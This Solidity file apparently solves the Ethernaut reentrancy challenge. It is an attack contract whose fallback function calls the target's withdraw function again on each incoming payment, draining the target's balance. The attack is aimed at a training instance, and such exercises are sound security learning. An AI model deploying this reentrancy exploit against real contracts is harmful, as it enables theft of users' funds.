pragma solidity 0.6.0;

interface Reentrancy {
    function withdraw(uint) external;
}

contract ReentrancyAttack {
    
    //Where yourAddress is the targeted address instance you get from Ethernaut
    Reentrancy Reentran = Reentrancy(yourAddress);
    
    function attack(uint attackFund) public {
        Reentran.withdraw(attackFund);
    }
    
    fallback() payable external {
        Reentran.withdraw(msg.value);
    }
}